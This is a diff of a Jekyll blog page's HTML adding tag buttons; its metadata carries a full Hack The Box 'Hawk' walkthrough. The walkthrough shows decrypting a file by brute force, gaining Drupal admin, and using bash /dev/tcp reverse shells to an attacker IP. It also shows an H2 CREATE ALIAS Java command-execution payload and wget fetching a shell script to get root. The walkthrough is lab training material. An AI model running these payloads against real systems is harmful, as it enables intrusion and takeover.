@@ -18,7 +18,8 @@
 <script type="application/ld+json">
 {"@type":"BlogPosting","headline":"Hack The Box - Hawk","dateModified":"2018-12-01T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/hawk/","datePublished":"2018-12-01T00:00:00+02:00","image":"http://localhost:4000/hackthebox/hawk/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/hawk/"},"description":"Hawk has retired and this is my write-up about it. It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in ! Nmap Starting with a simple nmap scan to scan tor TCP , UDP ports and services. nmap -sV -sT -sU 10.10.10.102 We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console. FTP Since there’s FTP on the box let’s check if we can do anonymous login. We could login as anonymous and we got a file called : .drupal.txt.enc Since it ends with .enc then it’s an encrypted file. Let’s run file command against it to get more information. file drupal.txt.enc drupal.txt.enc : openssl enc&#39;d data with salted password , base64 encoded So base64 encoded ? Let’s decode it. base64 -d drupal.txt.enc &gt; drupal_decoded.txt.enc Now the file is ready for bruteforcing. Decrypting The File To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou. It’s already installed on kali but if you’re not using kali you can get it from here Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing. I already cracked it so the cipher is AES-256-CBC and the digest is SHA256. bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1 You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default. Great ! We got the password : friends . Let’s decrypt the file. openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends Now we have a username : “daniel” and a password : PencilKeybaordScanner123 Drupal We see in the message that the password is for a portal. But what portal? Let’s visit the website on port 80 We see that it’s running drupal CMS Let’s login with the credentials we have. Username daniel didn’t work but admin worked and we got in as admin ! After we enumerate for a while we will see some interesting stuff. The content tab which allows us to add content and the modules tab. If we tried to add content we will get two options : Article or a basic page. We will focus on basic pages for sure but we can only use html , filtered html and plain text . Let’s look in the modules tab. We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code Great ! Let’s get a reverse shell &lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/9090 0&gt;&amp;1&#39;&quot;); Let’s check our listener. bam we got a low privilege shell as www-data ! Privilege Escalation to daniel So we’re now in as www-data let’s check sensitive files first. In drupal 7 documentation This section it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensitive information let’s check that out. We got a password : drupal4hawk , Let’s try ssh We got in ! But when we login we get a python interpreter. We will get a shell with pty import pty pty.spawn(&quot;/bin/sh&quot;) And we got user ! :D Accessing H2 Database Now with some regular enumeration if we check out root processes we will see those 2 processes. Sounds familiar ? Yup the H2 Database. If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console. Now we know that it’s running as root so let’s try to access that. Remote connection is disabled. This means that we can only connect locally. To bypass that we will use ssh tunneling. And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us. ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102 Now if we visit our localhost on port 8080 we will get the login page. By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error. Let’s try changing the JDBC URL to something we know that it exists. /root It worked . Now we have access to the console. Abusing H2 Database ALIAS and Privilege Escalation to root Basically the CREATE ALIAS method creates a function that executes java code. Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell. First we will create ALIAS called SHELLEXEC. The payload will be like this : CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; }$$; Then we will execute system commands by calling the function that we created. Let’s execute whoami. call SHELLEXEC(&quot;whoami&quot;) And we see root :D NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit here now since we can execute system commands it’s over ! We can get a root shell. But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it. Another way is to use msfvenom but it’s not needed here because the exploit is simple. First we will create the shell file. bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/1234 0&gt;&amp;1 &gt; shell Then we will set up a HTTP server with python to host the shell. python -m SimpleHTTPServer 7777 Now we will use wget to get the shell file on the box. call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;) We will make the file executable. call SHELLEXEC(&quot;chmod +x shell&quot;) Then we will rename it to shell.sh call SHELLEXEC(&quot;mv shell shell.sh&quot;) And finally we execute it. call SHELLEXEC(&quot;bash shell.sh&quot;) We don’t get a response which is a good sign. Let’s check our listener. And we get a shell as root ! :D That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Jerry Next Hack The Box write-up : Hack The Box - Active","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/ad.css">
+<link rel="stylesheet" href="/assets/css/tagbuttons.css">
+  <link rel="stylesheet" href="/assets/css/ad.css">
   <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
@@ -42,7 +43,7 @@
           </span>
         </label>
 
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
       </nav></div>
 </header>
 <main class="page-content" aria-label="Content">
@@ -52,6 +53,27 @@
   <header class="post-header">
     <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Hawk</h1>
     <p class="post-meta">
+      <h7>
+        Tags: 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Drupal/';">Drupal</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Cryptography/';">Cryptography</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Pivoting/';">Pivoting</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
+        
+      </h7>
+      <br>
       <time class="dt-published" datetime="2018-12-01T00:00:00+02:00" itemprop="datePublished">Dec 1, 2018
       </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
 </p>
@@ -230,7 +252,6 @@ pty.spawn("/bin/sh")
   </div>
 <script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/hawk/" hidden></a>
 </article>
-
 
       </div>
     </main><footer class="site-footer h-card">
